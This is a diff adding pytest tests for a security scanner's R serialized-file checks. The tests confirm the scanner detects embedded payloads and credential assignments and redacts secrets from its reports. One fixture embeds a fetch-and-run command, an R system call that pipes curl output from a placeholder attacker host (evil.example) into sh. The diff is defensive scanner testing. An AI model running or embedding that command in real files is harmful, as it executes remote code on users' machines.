@@ -11,6 +11,7 @@ import pytest
 from modelaudit import core
 from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.scanners import get_scanner_for_file
+from modelaudit.scanners._evidence_redaction import REDACTED_EVIDENCE_VALUE
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, Check, CheckStatus, IssueSeverity, ScanResult
 from modelaudit.scanners.r_serialized_scanner import RSerializedScanner
 from modelaudit.utils.file.detection import (
@@ -534,6 +535,395 @@ def test_scan_redacts_embedded_network_indicator_urls(tmp_path: Path) -> None:
     assert "pass" not in str(details)
     assert "SECRET_TOKEN" not in str(details)
     assert "SECRET_FRAGMENT" not in str(details)
+
+
+def test_scan_redacts_executable_payload_samples(tmp_path: Path) -> None:
+    path = tmp_path / "sample-leak.rds"
+    _write_raw_r_serialized(
+        path,
+        "\n".join(
+            [
+                "expression",
+                "language",
+                (
+                    "base::system('curl "
+                    "https://user:pass@evil.example/payload.sh?token=SECRET_TOKEN#SECRET_FRAGMENT "
+                    "| sh; token <- \"R_TOKEN_123456\"; password <<- 'R_PASS_123456'; "
+                    "Authorization: Bearer ABCDEFGHIJKLMNOP')"
+                ),
+            ]
+        ),
+    )
+
+    result = RSerializedScanner().scan(str(path))
+
+    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
+    assert len(symbol_checks) == 1
+    payload_checks = _check_by_name(result, "Serialized Expression Payload Detection")
+    assert len(payload_checks) == 1
+    samples = [
+        symbol_checks[0].details["examples"][0]["sample"],
+        payload_checks[0].details["examples"][0]["sample"],
+    ]
+
+    for sample in samples:
+        assert "base::system" in sample
+        assert "curl" in sample
+        assert "evil.example/payload.sh" in sample
+        assert "<redacted>" in sample
+        assert "user:pass" not in sample
+        assert "SECRET_TOKEN" not in sample
+        assert "SECRET_FRAGMENT" not in sample
+        assert "R_TOKEN_123456" not in sample
+        assert "R_PASS_123456" not in sample
+        assert "ABCDEFGHIJKLMNOP" not in sample
+
+
+def test_scan_redacts_rightward_assignment_payload_samples(tmp_path: Path) -> None:
+    path = tmp_path / "rightward-sample-leak.rds"
+    _write_raw_r_serialized(
+        path,
+        "\n".join(
+            [
+                "expression",
+                "language",
+                "base::system('curl'); 'R_TOKEN_RIGHTWARD' -> token; "
+                + '"R_PASS_RIGHTWARD" ->> password; R_BARE_RIGHTWARD -> access_token',
+            ]
+        ),
+    )
+
+    result = RSerializedScanner().scan(str(path))
+
+    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
+    assert len(symbol_checks) == 1
+    payload_checks = _check_by_name(result, "Serialized Expression Payload Detection")
+    assert len(payload_checks) == 1
+    samples = [
+        symbol_checks[0].details["examples"][0]["sample"],
+        payload_checks[0].details["examples"][0]["sample"],
+    ]
+
+    for sample in samples:
+        assert "base::system" in sample
+        assert "curl" in sample
+        assert "<redacted>" in sample
+        assert "R_TOKEN_RIGHTWARD" not in sample
+        assert "R_PASS_RIGHTWARD" not in sample
+        assert "R_BARE_RIGHTWARD" not in sample
+
+
+def test_scan_redacts_and_detects_rightward_assignment_expressions(tmp_path: Path) -> None:
+    path = tmp_path / "rightward-expression-sample-leak.rds"
+    _write_raw_r_serialized(
+        path,
+        'expression\nlanguage\nbase::system("curl"); paste("PREFIX;RIGHTWARD_SECRET", collapse=";") -> token',
+    )
+
+    result = RSerializedScanner().scan(str(path))
+
+    credential_checks = _check_by_name(result, "Credential-like String Detection")
+    assert len(credential_checks) == 1
+    assert credential_checks[0].status == CheckStatus.FAILED
+    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
+    sample = symbol_checks[0].details["examples"][0]["sample"]
+    assert 'base::system("curl")' in sample
+    assert "<redacted> -> token" in sample
+    assert "PREFIX" not in sample
+    assert "RIGHTWARD_SECRET" not in sample
+
+
+def test_scan_redacts_and_detects_leftward_assignment_expressions(tmp_path: Path) -> None:
+    path = tmp_path / "leftward-expression-sample-leak.rds"
+    _write_raw_r_serialized(
+        path,
+        'expression\nlanguage\nbase::system("curl"); token <- paste0("LEFTWARD_SECRET", "TAIL")',
+    )
+
+    result = RSerializedScanner().scan(str(path))
+
+    credential_checks = _check_by_name(result, "Credential-like String Detection")
+    assert len(credential_checks) == 1
+    assert credential_checks[0].status == CheckStatus.FAILED
+    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
+    sample = symbol_checks[0].details["examples"][0]["sample"]
+    assert 'base::system("curl")' in sample
+    assert f"token <- {REDACTED_EVIDENCE_VALUE}" in sample
+    assert "LEFTWARD_SECRET" not in sample
+    assert "TAIL" not in sample
+
+
+@pytest.mark.parametrize(
+    ("assignment", "secret"),
+    [
+        (r'token <- "ABC\"ESCAPED_SECRET"', "ESCAPED_SECRET"),
+        ('`access-token` <- "BACKTICK_LEFT_SECRET"', "BACKTICK_LEFT_SECRET"),
+        ('"BACKTICK_RIGHT_SECRET" -> `client-secret`', "BACKTICK_RIGHT_SECRET"),
+        ('`access token` <- "SPACED_BACKTICK_SECRET"', "SPACED_BACKTICK_SECRET"),
+        ('`access token` = "BACKTICK_EQUALS_SECRET"', "BACKTICK_EQUALS_SECRET"),
+        ('api.key <- "DOT_LEFT_SECRET"', "DOT_LEFT_SECRET"),
+        ('"DOT_RIGHT_SECRET" -> access.token', "DOT_RIGHT_SECRET"),
+        ('dbPassword <- "CAMEL_PASSWORD_SECRET"', "CAMEL_PASSWORD_SECRET"),
+        ('sessionToken <<- "CAMEL_TOKEN_SECRET"', "CAMEL_TOKEN_SECRET"),
+        ('`dbPassword` <- "BACKTICK_CAMEL_SECRET"', "BACKTICK_CAMEL_SECRET"),
+        ('token[1] <- "INDEXED_TOKEN_SECRET"', "INDEXED_TOKEN_SECRET"),
+        ('config$token <- "MEMBER_TOKEN_SECRET"', "MEMBER_TOKEN_SECRET"),
+        ('config@password <- "SLOT_PASSWORD_SECRET"', "SLOT_PASSWORD_SECRET"),
+        ('config[["api_key"]] <- "SUBSCRIPT_API_SECRET"', "SUBSCRIPT_API_SECRET"),
+        ('"RIGHT_MEMBER_SECRET" -> config$token', "RIGHT_MEMBER_SECRET"),
+        ('pwd <- "PWD_SECRET_VALUE"', "PWD_SECRET_VALUE"),
+        ('token <- r"(RAW_LEFT_SECRET)"', "RAW_LEFT_SECRET"),
+        ('token = r"(RAW_EQUALS_SECRET)"', "RAW_EQUALS_SECRET"),
+        ('R"---{RAW_RIGHT_SECRET}---" -> client.secret', "RAW_RIGHT_SECRET"),
+        ('refresh.token <- r"[raw values may contain \\"quotes\\" and ; delimiters]"', "raw values may contain"),
+        ('token <- r"(UNTERMINATED_RAW_SECRET', "UNTERMINATED_RAW_SECRET"),
+        ('"access token" <- "QUOTED_NAME_SECRET"', "QUOTED_NAME_SECRET"),
+        ("r\"(QUOTED_RAW_SECRET)\" -> 'client.secret'", "QUOTED_RAW_SECRET"),
+    ],
+)
+def test_scan_redacts_complex_r_assignment_payload_samples(tmp_path: Path, assignment: str, secret: str) -> None:
+    path = tmp_path / "complex-assignment-sample-leak.rds"
+    _write_raw_r_serialized(path, f"expression\nlanguage\nbase::system('curl'); {assignment}")
+
+    result = RSerializedScanner().scan(str(path))
+
+    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
+    assert len(symbol_checks) == 1
+    payload_checks = _check_by_name(result, "Serialized Expression Payload Detection")
+    assert len(payload_checks) == 1
+    samples = [
+        symbol_checks[0].details["examples"][0]["sample"],
+        payload_checks[0].details["examples"][0]["sample"],
+    ]
+
+    for sample in samples:
+        assert "<redacted>" in sample
+        assert secret not in sample
+
+
+@pytest.mark.parametrize(
+    "assignment",
+    [
+        "token <- 'LEFTWARD_SECRET'",
+        "password <<- 'GLOBAL_LEFT_SECRET'",
+        "'RIGHTWARD_SECRET' -> token",
+        "'GLOBAL_RIGHT_SECRET' ->> password",
+        "access_token <- 'COMPOUND_LEFT_SECRET'",
+        "'COMPOUND_RIGHT_SECRET' -> client_secret",
+        "`access-token` <- 'BACKTICK_LEFT_SECRET'",
+        "'BACKTICK_RIGHT_SECRET' -> `refresh-token`",
+        "`api key` <- 'SPACED_BACKTICK_SECRET'",
+        '`access token` = "BACKTICK_EQUALS_SECRET"',
+        r'token <- "ABC\"ESCAPED_SECRET"',
+        "api.key <- 'DOT_LEFT_SECRET'",
+        "'DOT_RIGHT_SECRET' -> access.token",
+        "dbPassword <- 'CAMEL_PASSWORD_SECRET'",
+        "sessionToken <<- 'CAMEL_TOKEN_SECRET'",
+        "`dbPassword` <- 'BACKTICK_CAMEL_SECRET'",
+        "token[1] <- 'INDEXED_TOKEN_SECRET'",
+        "config$token <- 'MEMBER_TOKEN_SECRET'",
+        "config@password <- 'SLOT_PASSWORD_SECRET'",
+        'config[["api_key"]] <- "SUBSCRIPT_API_SECRET"',
+        "'RIGHT_MEMBER_SECRET' -> config$token",
+        "pwd <- 'PWD_SECRET_VALUE'",
+        'token <- r"(RAW_LEFT_SECRET)"',
+        'token = r"(RAW_EQUALS_SECRET)"',
+        'R"---{RAW_RIGHT_SECRET}---" -> client.secret',
+        'refresh.token <- r"[raw values may contain \\"quotes\\" and ; delimiters]"',
+        '"access token" <- "QUOTED_NAME_SECRET"',
+        "r\"(QUOTED_RAW_SECRET)\" -> 'client.secret'",
+    ],
+)
+def test_scan_detects_native_r_credential_assignments(tmp_path: Path, assignment: str) -> None:
+    path = tmp_path / "native-credential-assignment.rds"
+    _write_raw_r_serialized(path, assignment)
+
+    result = RSerializedScanner().scan(str(path))
+
+    credential_checks = _check_by_name(result, "Credential-like String Detection")
+    assert len(credential_checks) == 1
+    assert credential_checks[0].status == CheckStatus.FAILED
+    assert credential_checks[0].details["pattern_classes"] == ["generic_secret_assignment"]
+
+
+def test_scan_redacts_unterminated_raw_assignment_without_credential_false_positive(tmp_path: Path) -> None:
+    path = tmp_path / "unterminated-raw-assignment.rds"
+    _write_raw_r_serialized(
+        path,
+        'expression\nlanguage\nbase::system("curl"); token <- r"(UNTERMINATED_RAW_SECRET',
+    )
+
+    result = RSerializedScanner().scan(str(path))
+
+    credential_checks = _check_by_name(result, "Credential-like String Detection")
+    assert len(credential_checks) == 1
+    assert credential_checks[0].status == CheckStatus.PASSED
+    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
+    sample = symbol_checks[0].details["examples"][0]["sample"]
+    assert "UNTERMINATED_RAW_SECRET" not in sample
+    assert sample.endswith("token <- <redacted>")
+
+
+def test_scan_recovers_after_malformed_raw_prefix(tmp_path: Path) -> None:
+    path = tmp_path / "malformed-prefix-before-credential.rds"
+    _write_raw_r_serialized(
+        path,
+        'expression\nlanguage\nbase::system("curl"); r"{BROKEN_PREFIX; token <- r"(LATER_RAW_SECRET)"',
+    )
+
+    result = RSerializedScanner().scan(str(path))
+
+    credential_checks = _check_by_name(result, "Credential-like String Detection")
+    assert len(credential_checks) == 1
+    assert credential_checks[0].status == CheckStatus.FAILED
+    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
+    sample = symbol_checks[0].details["examples"][0]["sample"]
+    assert "LATER_RAW_SECRET" not in sample
+    assert sample.endswith("token <- <redacted>")
+
+
+@pytest.mark.parametrize(
+    "assignment",
+    [
+        'token <- r"(MULTILINE_RAW_SECRET\ncurl payload)"',
+        'token <- "MULTILINE_QUOTED_SECRET\ncurl payload"',
+    ],
+)
+def test_scan_detects_and_redacts_multiline_credential_assignments(tmp_path: Path, assignment: str) -> None:
+    path = tmp_path / "multiline-credential-assignment.rds"
+    _write_raw_r_serialized(
+        path,
+        f'expression\nlanguage\nbase::system("curl"); {assignment}',
+    )
+
+    result = RSerializedScanner().scan(str(path))
+
+    credential_checks = _check_by_name(result, "Credential-like String Detection")
+    assert len(credential_checks) == 1
+    assert credential_checks[0].status == CheckStatus.FAILED
+    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
+    sample = symbol_checks[0].details["examples"][0]["sample"]
+    assert "<redacted>" in sample
+    assert "MULTILINE" not in sample
+    assert "payload" not in sample
+
+
+def test_scan_redacts_indented_multiline_credential_assignment(tmp_path: Path) -> None:
+    path = tmp_path / "indented-multiline-credential-assignment.rds"
+    _write_raw_r_serialized(
+        path,
+        'expression\nlanguage\nbase::system("curl"); token <- "FIRST_SECRET\n\tSECOND_SECRET base::system(curl)"',
+    )
+
+    result = RSerializedScanner().scan(str(path))
+
+    credential_checks = _check_by_name(result, "Credential-like String Detection")
+    assert len(credential_checks) == 1
+    assert credential_checks[0].status == CheckStatus.FAILED
+    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
+    sample = symbol_checks[0].details["examples"][0]["sample"]
+    assert "FIRST_SECRET" not in sample
+    assert "SECOND_SECRET" not in sample
+    assert REDACTED_EVIDENCE_VALUE in sample
+
+
+def test_scan_redacts_unterminated_quoted_assignment_without_credential_false_positive(tmp_path: Path) -> None:
+    path = tmp_path / "unterminated-quoted-assignment.rds"
+    _write_raw_r_serialized(
+        path,
+        'expression\nlanguage\nbase::system("curl"); token <- "UNTERMINATED_QUOTED_SECRET',
+    )
+
+    result = RSerializedScanner().scan(str(path))
+
+    credential_checks = _check_by_name(result, "Credential-like String Detection")
+    assert len(credential_checks) == 1
+    assert credential_checks[0].status == CheckStatus.PASSED
+    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
+    sample = symbol_checks[0].details["examples"][0]["sample"]
+    assert "UNTERMINATED_QUOTED_SECRET" not in sample
+    assert sample.endswith("token <- <redacted>")
+
+
+def test_scan_detects_long_rightward_raw_credential_identifier(tmp_path: Path) -> None:
+    path = tmp_path / "long-rightward-raw-assignment.rds"
+    long_identifier = f"service_{'a' * 300}_token"
+    _write_raw_r_serialized(
+        path,
+        f'expression\nlanguage\nbase::system("curl"); r"(LONG_RIGHTWARD_RAW_SECRET)" -> {long_identifier}',
+    )
+
+    result = RSerializedScanner().scan(str(path))
+
+    credential_checks = _check_by_name(result, "Credential-like String Detection")
+    assert len(credential_checks) == 1
+    assert credential_checks[0].status == CheckStatus.FAILED
+    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
+    sample = symbol_checks[0].details["examples"][0]["sample"]
+    assert "LONG_RIGHTWARD_RAW_SECRET" not in sample
+    assert sample.startswith('base::system("curl"); <redacted> -> service_')
+
+
+def test_scan_allows_benign_r_assignment_key_near_matches(tmp_path: Path) -> None:
+    path = tmp_path / "benign-native-assignments.rds"
+    _write_raw_r_serialized(
+        path,
+        "monkey <- 'BENIGN_VALUE'; tokenizer <- 'BENIGN_VALUE'; `not-a-tokenizer` <- 'BENIGN_VALUE'; "
+        "`not a tokenizer` <- 'BENIGN_VALUE'; signature <- 'gaussian'; credential <- 'standard'; "
+        "sas <- 'dataset-value'; sig <- 'benign-value'; token.count <- 'BENIGN_VALUE'; "
+        "api.keyboard <- 'BENIGN_VALUE'; `not.a.tokenizer` <- 'BENIGN_VALUE'; "
+        '"tokenizer" <- "BENIGN_VALUE"; "not a tokenizer" <- "BENIGN_VALUE"; '
+        "tokenizer[1] <- 'BENIGN_VALUE'; config$tokenizer <- 'BENIGN_VALUE'; "
+        'config[["tokenizer"]] <- "BENIGN_VALUE"',
+    )
+
+    result = RSerializedScanner().scan(str(path))
+
+    credential_checks = _check_by_name(result, "Credential-like String Detection")
+    assert len(credential_checks) == 1
+    assert credential_checks[0].status == CheckStatus.PASSED
+
+
+def test_scan_allows_benign_json_credential_key_metadata(tmp_path: Path) -> None:
+    path = tmp_path / "benign-json-metadata.rds"
+    _write_raw_r_serialized(
+        path,
+        '{"token": "standard", "client.secret": "metadata"}',
+    )
+
+    result = RSerializedScanner().scan(str(path))
+
+    credential_checks = _check_by_name(result, "Credential-like String Detection")
+    assert len(credential_checks) == 1
+    assert credential_checks[0].status == CheckStatus.PASSED
+
+
+@pytest.mark.parametrize(
+    "metadata",
+    [
+        'r"(example: "NOT_A_SECRET" -> token)"',
+        "'\"NOT_A_SECRET\" -> token'",
+        '# "NOT_A_SECRET" -> token',
+        'token: "NOT_A_SECRET"',
+        'token: r"(NOT_A_SECRET)"',
+        '# token <- r"(NOT_A_SECRET)"',
+        '# r"(NOT_A_SECRET)" -> token',
+        "'token <- r\"(NOT_A_SECRET)\"'",
+        '# r"{BROKEN; token <- r"(NOT_A_SECRET)"',
+        '\'r"{BROKEN; token <- r"(NOT_A_SECRET)"\'',
+        'list(token = "standard")',
+        'function(token = "standard") NULL',
+    ],
+)
+def test_scan_allows_assignment_examples_inside_benign_metadata(tmp_path: Path, metadata: str) -> None:
+    path = tmp_path / "benign-assignment-example.rds"
+    _write_raw_r_serialized(path, metadata)
+
+    result = RSerializedScanner().scan(str(path))
+
+    credential_checks = _check_by_name(result, "Credential-like String Detection")
+    assert len(credential_checks) == 1
+    assert credential_checks[0].status == CheckStatus.PASSED
 
 
 def test_scan_doc_heavy_content_with_risky_words_is_not_critical(tmp_path: Path) -> None:
